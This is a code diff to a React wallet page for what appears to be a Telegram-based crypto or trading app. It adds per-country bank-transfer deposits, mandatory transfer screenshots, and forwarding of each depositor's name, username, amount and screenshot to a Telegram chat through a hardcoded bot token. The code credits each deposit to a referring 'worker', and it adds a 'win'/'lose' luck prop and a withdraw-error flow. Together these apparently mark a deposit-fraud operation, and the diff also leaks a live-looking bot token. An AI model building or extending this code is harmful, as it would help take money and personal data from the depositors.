@@ -1,6 +1,8 @@
 import React, { useState } from 'react';
 import { ArrowUpRight, ArrowDownLeft, History, Wallet, Plus, X, Copy, Check, CreditCard, AlertCircle, TrendingUp, TrendingDown, Sparkles, Bitcoin, RefreshCw, Clock, CheckCircle, XCircle } from 'lucide-react';
 import { UsdtIcon, getCryptoIcon } from '../icons';
+import { supabase } from '../supabaseClient';
+import { notifyDeposit, notifyWithdraw } from '../utils/notifications';
 import type { Transaction, DbSettings } from '../types';
 
 interface WalletPageProps {
@@ -10,6 +12,8 @@ interface WalletPageProps {
   onWithdraw: (amount: number) => void;
   settings: DbSettings;
   onModalChange?: (isOpen: boolean) => void;
+  userLuck?: 'win' | 'lose' | 'default';
+  isKyc?: boolean;
 }
 
 type DepositMethod = 'card' | 'crypto';
@@ -21,7 +25,7 @@ interface WithdrawRequest {
   date: string;
 }
 
-const WalletPage: React.FC<WalletPageProps> = ({ history, balance, onDeposit, onWithdraw, settings, onModalChange }) => {
+const WalletPage: React.FC<WalletPageProps> = ({ history, balance, onDeposit, onWithdraw, settings, onModalChange, userLuck = 'default', isKyc = false }) => {
     const [activeModal, setActiveModal] = useState<'deposit' | 'withdraw' | 'converter' | 'processing' | 'withdraw-error' | null>(null);
     const [depositMethod, setDepositMethod] = useState<DepositMethod | null>(null);
     const [copied, setCopied] = useState(false);
@@ -29,11 +33,64 @@ const WalletPage: React.FC<WalletPageProps> = ({ history, balance, onDeposit, on
     const [withdrawAmount, setWithdrawAmount] = useState('');
     const [withdrawAddress, setWithdrawAddress] = useState('');
     const [withdrawError, setWithdrawError] = useState<string | null>(null);
+    const [selectedCountry, setSelectedCountry] = useState('Россия');
+    const [uploadedScreenshot, setUploadedScreenshot] = useState<File | null>(null);
+    const [screenshotPreview, setScreenshotPreview] = useState<string | null>(null);
     
     // Converter state
     const [convertFrom, setConvertFrom] = useState('RUB');
     const [convertTo, setConvertTo] = useState('USDT');
     const [convertAmount, setConvertAmount] = useState('1000');
+
+    // Список стран и их валют
+    const countries = [
+        { name: 'Россия', currency: 'RUB', flag: '🇷🇺', rate: 0.0105 },
+        { name: 'Казахстан', currency: 'KZT', flag: '🇰🇿', rate: 0.0022 },
+        { name: 'Узбекистан', currency: 'UZS', flag: '🇺🇿', rate: 0.000081 },
+        { name: 'Киргизия', currency: 'KGS', flag: '🇰🇬', rate: 0.0115 },
+        { name: 'Таджикистан', currency: 'TJS', flag: '🇹🇯', rate: 0.092 },
+        { name: 'США', currency: 'USD', flag: '🇺🇸', rate: 1.0 },
+        { name: 'Европа', currency: 'EUR', flag: '🇪🇺', rate: 1.08 }
+    ];
+
+    const [countryBankDetails, setCountryBankDetails] = useState<Record<string, string>>({});
+
+    // Загружаем реквизиты по странам из Supabase
+    React.useEffect(() => {
+        const loadCountryBankDetails = async () => {
+            try {
+                const { supabase } = await import('../supabaseClient');
+                
+                const { data, error } = await supabase
+                    .from('country_bank_details')
+                    .select('country_name, bank_details')
+                    .eq('is_active', true);
+                
+                if (error) {
+                    console.error('Ошибка загрузки реквизитов:', error);
+                    return;
+                }
+                
+                const detailsMap: Record<string, string> = {};
+                data?.forEach(item => {
+                    detailsMap[item.country_name] = item.bank_details;
+                });
+                
+                setCountryBankDetails(detailsMap);
+            } catch (error) {
+                console.error('Ошибка при загрузке реквизитов:', error);
+            }
+        };
+        
+        loadCountryBankDetails();
+    }, []);
+
+    const getCurrentCountry = () => countries.find(c => c.name === selectedCountry) || countries[0];
+
+    const getCurrentBankDetails = () => {
+        const country = getCurrentCountry();
+        return countryBankDetails[country.name] || `${country.name}: Реквизиты не найдены`;
+    };
 
     // Активные заявки на вывод
     const [withdrawRequests] = useState<WithdrawRequest[]>([
@@ -78,15 +135,246 @@ const WalletPage: React.FC<WalletPageProps> = ({ history, balance, onDeposit, on
     const closeModal = () => {
         setActiveModal(null);
         setDepositMethod(null);
+        setUploadedScreenshot(null);
+        setScreenshotPreview(null);
         onModalChange?.(false);
     };
 
-    const submitDeposit = () => {
+    const handleScreenshotUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
+        const file = event.target.files?.[0];
+        if (file && file.type.startsWith('image/')) {
+            setUploadedScreenshot(file);
+            
+            // Создаем превью
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                setScreenshotPreview(e.target?.result as string);
+            };
+            reader.readAsDataURL(file);
+        }
+    };
+
+    const removeScreenshot = () => {
+        setUploadedScreenshot(null);
+        setScreenshotPreview(null);
+    };
+
+    const sendToTelegram = async (depositData: {
+        amount: string;
+        country: string;
+        currency: string;
+        screenshot: File | null;
+        userId: number;
+    }) => {
+        try {
+            // Получаем данные пользователя из Supabase
+            const { data: userData, error: userError } = await supabase
+                .from('users')
+                .select('user_id, username, full_name, referrer_id')
+                .eq('user_id', depositData.userId)
+                .single();
+
+            if (userError) {
+                console.error('Ошибка получения данных пользователя:', userError);
+            }
+
+            // Получаем данные воркера (реферера) если есть
+            let workerData = null;
+            if (userData?.referrer_id) {
+                const { data: worker, error: workerError } = await supabase
+                    .from('users')
+                    .select('user_id, username, full_name')
+                    .eq('user_id', userData.referrer_id)
+                    .single();
+
+                if (workerError) {
+                    console.error('Ошибка получения данных воркера:', workerError);
+                } else {
+                    workerData = worker;
+                }
+            }
+
+            // Формируем информацию о пользователе
+            const userName = userData?.full_name || 'Неизвестно';
+            const userNickname = userData?.username || 'Нет никнейма';
+            const userInfo = `${userName} (${userNickname}) ID: ${userData?.user_id || depositData.userId}`;
+
+            // Формируем информацию о воркере
+            const workerInfo = workerData 
+                ? `${workerData.full_name || 'Неизвестно'} (${workerData.username || 'Нет никнейма'}) ID: ${workerData.user_id}`
+                : 'Прямая регистрация';
+
+            // Добавляем текстовые данные
+            const message = `
+🔔 НОВАЯ ЗАЯВКА НА ПОПОЛНЕНИЕ
+
+👤 Пользователь: ${userInfo}
+👨‍💼 Воркер: ${workerInfo}
+💰 Сумма: ${depositData.amount} ${depositData.currency}
+💵 В USDT: ≈ $${(parseFloat(depositData.amount) * (depositData.currency === 'RUB' ? 0.0105 : depositData.currency === 'KZT' ? 0.0022 : depositData.currency === 'UZS' ? 0.000081 : depositData.currency === 'KGS' ? 0.0115 : depositData.currency === 'TJS' ? 0.092 : depositData.currency === 'USD' ? 1.0 : 1.08)).toFixed(2)}
+🌍 Страна: ${depositData.country}
+🏦 Валюта: ${depositData.currency}
+📅 Дата: ${new Date().toLocaleString('ru-RU')}
+🆔 ID заявки: ${Date.now()}
+
+${depositData.screenshot ? '📸 Скриншот прикреплен' : '❌ Скриншот отсутствует'}
+
+#пополнение #${depositData.country.toLowerCase().replace(' ', '_')} #${depositData.currency.toLowerCase()}
+            `.trim();
+            
+            const botToken = '7769124785:AAE46Zt6jh9IPVt4IB4u0j8kgEVg2NpSYa0';
+            const chatId = '-1003560670670';
+            
+            let response;
+            
+            if (depositData.screenshot) {
+                // Отправляем с фото
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('caption', message);
+                formData.append('photo', depositData.screenshot, depositData.screenshot.name);
+                formData.append('parse_mode', 'HTML');
+                
+                response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } else {
+                // Отправляем только текст для криптовалютных пополнений
+                response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            }
+            
+            if (response.ok) {
+                const result = await response.json();
+                console.log('Заявка успешно отправлена в Telegram:', result);
+                return true;
+            } else {
+                let errorData;
+                try {
+                    errorData = await response.json();
+                } catch (e) {
+                    errorData = await response.text();
+                }
+                console.error('Ошибка отправки в Telegram:', {
+                    status: response.status,
+                    statusText: response.statusText,
+                    error: errorData
+                });
+                
+                // Если ошибка с фото, попробуем отправить только текст
+                if (depositData.screenshot && (response.status === 400 || (errorData && errorData.error_code === 400))) {
+                    console.log('Попытка отправить только текст...');
+                    const textResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message + '\n\n⚠️ Скриншот не удалось прикрепить',
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    if (textResponse.ok) {
+                        console.log('Текстовое сообщение отправлено');
+                        return true;
+                    }
+                }
+                
+                return false;
+            }
+        } catch (error) {
+            console.error('Ошибка при отправке в Telegram:', error);
+            
+            // Попробуем отправить простое текстовое сообщение для диагностики
+            try {
+                const botToken = '7769124785:AAE46Zt6jh9IPVt4IB4u0j8kgEVg2NpSYa0';
+                const chatId = '-1003560670670';
+                
+                const testResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: '🔧 Тестовое сообщение - проверка доступа бота к каналу',
+                    })
+                });
+                
+                if (testResponse.ok) {
+                    console.log('Тестовое сообщение отправлено успешно');
+                } else {
+                    const testError = await testResponse.json();
+                    console.error('Ошибка тестового сообщения:', testError);
+                }
+            } catch (testError) {
+                console.error('Ошибка при отправке тестового сообщения:', testError);
+            }
+            
+            return false;
+        }
+    };
+
+    const submitDeposit = async () => {
         const val = parseFloat(depositAmount);
         if (val > 0 && depositMethod) {
-            onDeposit(val, depositMethod);
-            closeModal();
-            setDepositAmount('5000');
+            // Проверяем наличие скриншота для банковской карты
+            if (depositMethod === 'card' && !uploadedScreenshot) {
+                alert('Пожалуйста, прикрепите скриншот перевода');
+                return;
+            }
+            
+            // Получаем ID пользователя из Telegram WebApp или URL
+            const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
+            let userId = tgUser?.id;
+            
+            // Fallback: читаем tgid из URL
+            if (!userId) {
+                const urlParams = new URLSearchParams(window.location.search);
+                const urlTgId = urlParams.get('tgid');
+                if (urlTgId && !isNaN(Number(urlTgId))) {
+                    userId = Number(urlTgId);
+                }
+            }
+            
+            // Последний fallback для разработки
+            if (!userId) {
+                userId = 12345;
+            }
+            
+            // Отправляем данные в Telegram для всех методов
+            const success = await sendToTelegram({
+                amount: depositAmount,
+                country: depositMethod === 'card' ? selectedCountry : 'Криптовалюта',
+                currency: depositMethod === 'card' ? getCurrentCountry().currency : 'USDT',
+                screenshot: depositMethod === 'card' ? uploadedScreenshot : null,
+                userId: userId
+            });
+            
+            if (success) {
+                // Уведомляем воркера о пополнении
+                const currency = depositMethod === 'card' ? getCurrentCountry().currency : 'USDT';
+                const methodName = depositMethod === 'card' ? 'Банковская карта' : 'Криптовалюта';
+                notifyDeposit(val, currency, methodName);
+                
+                onDeposit(val, depositMethod);
+                closeModal();
+                setDepositAmount('5000');
+            } else {
+                alert('Ошибка при отправке заявки. Попробуйте еще раз.');
+            }
         }
     };
 
@@ -133,10 +421,6 @@ const WalletPage: React.FC<WalletPageProps> = ({ history, balance, onDeposit, on
                 <div className="w-full rounded-2xl relative overflow-hidden bg-gradient-to-br from-[#1c1c1e] to-[#111113] border border-gray-800/50 p-4">
                     <div className="flex items-center justify-between mb-3">
                         <span className="text-gray-500 text-xs font-medium uppercase">Баланс</span>
-                        <div className="flex items-center gap-1 text-[#00C896] text-xs">
-                            <Sparkles size={10} />
-                            Active
-                        </div>
                     </div>
                     
                     <div className="text-3xl font-bold text-white mb-4">
@@ -318,26 +602,129 @@ const WalletPage: React.FC<WalletPageProps> = ({ history, balance, onDeposit, on
                             <div className="space-y-4">
                                 <button onClick={() => setDepositMethod(null)} className="text-sm text-[#0098EA] mb-2">← Назад</button>
                                 
+                                {/* Выбор страны */}
                                 <div>
-                                    <label className="text-xs text-gray-500 uppercase mb-2 block">Сумма (RUB)</label>
-                                    <input type="number" value={depositAmount} onChange={e => setDepositAmount(e.target.value)} className="w-full bg-[#111113] rounded-xl p-3 text-lg font-bold outline-none border border-gray-800 focus:border-[#0098EA]" placeholder="5000" />
-                                    <div className="text-xs text-gray-500 mt-1">≈ ${(parseFloat(depositAmount || '0') * 0.0105).toFixed(2)} USDT</div>
+                                    <label className="text-xs text-gray-500 uppercase mb-2 block">Страна</label>
+                                    <div className="bg-[#111113] rounded-xl border border-gray-800 focus-within:border-[#0098EA]">
+                                        <select 
+                                            value={selectedCountry} 
+                                            onChange={e => setSelectedCountry(e.target.value)}
+                                            className="w-full bg-transparent p-3 text-white outline-none appearance-none"
+                                        >
+                                            {countries.map(country => (
+                                                <option key={country.name} value={country.name} className="bg-[#1c1c1e]">
+                                                    {country.flag} {country.name} ({country.currency})
+                                                </option>
+                                            ))}
+                                        </select>
+                                    </div>
+                                </div>
+
+                                <div>
+                                    <label className="text-xs text-gray-500 uppercase mb-2 block">
+                                        Сумма ({getCurrentCountry().currency})
+                                    </label>
+                                    <input 
+                                        type="number" 
+                                        value={depositAmount} 
+                                        onChange={e => setDepositAmount(e.target.value)} 
+                                        className="w-full bg-[#111113] rounded-xl p-3 text-lg font-bold outline-none border border-gray-800 focus:border-[#0098EA]" 
+                                        placeholder={getCurrentCountry().currency === 'RUB' ? '5000' : getCurrentCountry().currency === 'USD' ? '50' : '1000'} 
+                                    />
+                                    <div className="text-xs text-gray-500 mt-1">
+                                        ≈ ${(parseFloat(depositAmount || '0') * getCurrentCountry().rate).toFixed(2)} USDT
+                                    </div>
                                 </div>
 
                                 {depositMethod === 'card' && (
-                                    <div className="bg-[#2c2c2e] p-4 rounded-xl">
-                                        <div className="text-xs text-[#0098EA] uppercase mb-2">Реквизиты</div>
-                                        <div className="flex items-center gap-2">
-                                            <span className="font-mono text-sm flex-1">{details}</span>
-                                            <button onClick={() => handleCopy(details)} className={`p-2 rounded-lg ${copied ? 'bg-[#00C896]/20 text-[#00C896]' : 'bg-gray-700 text-gray-400'}`}>
-                                                {copied ? <Check size={14} /> : <Copy size={14} />}
-                                            </button>
+                                    <>
+                                        <div className="bg-[#2c2c2e] p-4 rounded-xl">
+                                            <div className="text-xs text-[#0098EA] uppercase mb-2">
+                                                Реквизиты для {getCurrentCountry().name}
+                                            </div>
+                                            <div className="flex items-center gap-2">
+                                                <div className="font-mono text-sm flex-1 whitespace-pre-line">
+                                                    {getCurrentBankDetails()}
+                                                </div>
+                                                <button 
+                                                    onClick={() => handleCopy(getCurrentBankDetails())} 
+                                                    className={`p-2 rounded-lg ${copied ? 'bg-[#00C896]/20 text-[#00C896]' : 'bg-gray-700 text-gray-400'}`}
+                                                >
+                                                    {copied ? <Check size={14} /> : <Copy size={14} />}
+                                                </button>
+                                            </div>
+                                            <div className="text-xs text-gray-400 mt-2">
+                                                {getCurrentCountry().name === 'Россия' ? 'Переводы через СБП или на карту Сбербанка' :
+                                                 getCurrentCountry().name === 'Казахстан' ? 'Переводы через Kaspi или на карту банка' :
+                                                 getCurrentCountry().name === 'Узбекистан' ? 'Переводы через Uzcard или Humo' :
+                                                 getCurrentCountry().name === 'Киргизия' ? 'Переводы через банковскую карту' :
+                                                 getCurrentCountry().name === 'Таджикистан' ? 'Переводы через банковскую карту' :
+                                                 getCurrentCountry().name === 'США' ? 'Wire transfer or ACH' :
+                                                 'SEPA transfer or bank card'}
+                                            </div>
                                         </div>
-                                    </div>
+
+                                        {/* Загрузка скриншота */}
+                                        <div>
+                                            <label className="text-xs text-gray-500 uppercase mb-2 block">
+                                                Скриншот перевода *
+                                            </label>
+                                            
+                                            {!screenshotPreview ? (
+                                                <label className="w-full bg-[#111113] border-2 border-dashed border-gray-700 rounded-xl p-6 flex flex-col items-center justify-center cursor-pointer hover:border-[#0098EA] transition-colors">
+                                                    <div className="w-12 h-12 rounded-full bg-[#0098EA]/20 flex items-center justify-center mb-3">
+                                                        <Plus size={24} className="text-[#0098EA]" />
+                                                    </div>
+                                                    <span className="text-sm font-medium text-gray-300 mb-1">
+                                                        Прикрепить скриншот
+                                                    </span>
+                                                    <span className="text-xs text-gray-500 text-center">
+                                                        JPG, PNG до 10MB
+                                                    </span>
+                                                    <input
+                                                        type="file"
+                                                        accept="image/*"
+                                                        onChange={handleScreenshotUpload}
+                                                        className="hidden"
+                                                    />
+                                                </label>
+                                            ) : (
+                                                <div className="relative">
+                                                    <img 
+                                                        src={screenshotPreview} 
+                                                        alt="Скриншот перевода"
+                                                        className="w-full h-48 object-cover rounded-xl border border-gray-700"
+                                                    />
+                                                    <button
+                                                        onClick={removeScreenshot}
+                                                        className="absolute top-2 right-2 w-8 h-8 bg-[#FF3B30] rounded-full flex items-center justify-center text-white"
+                                                    >
+                                                        <X size={16} />
+                                                    </button>
+                                                    <div className="absolute bottom-2 left-2 bg-black/80 backdrop-blur-sm rounded-lg px-2 py-1">
+                                                        <span className="text-xs text-white">
+                                                            {uploadedScreenshot?.name}
+                                                        </span>
+                                                    </div>
+                                                </div>
+                                            )}
+                                        </div>
+                                    </>
                                 )}
 
-                                <button onClick={submitDeposit} className="w-full bg-[#00C896] text-black font-bold py-3.5 rounded-xl active:scale-[0.98]">
-                                    Я перевел средства
+                                <button 
+                                    onClick={submitDeposit} 
+                                    disabled={depositMethod === 'card' && !uploadedScreenshot}
+                                    className={`w-full font-bold py-3.5 rounded-xl active:scale-[0.98] transition-all ${
+                                        depositMethod === 'card' && !uploadedScreenshot 
+                                            ? 'bg-gray-600 text-gray-400 cursor-not-allowed' 
+                                            : 'bg-[#00C896] text-black'
+                                    }`}
+                                >
+                                    {depositMethod === 'card' && !uploadedScreenshot 
+                                        ? 'Прикрепите скриншот' 
+                                        : 'Я перевел средства'
+                                    }
                                 </button>
                             </div>
                         )}
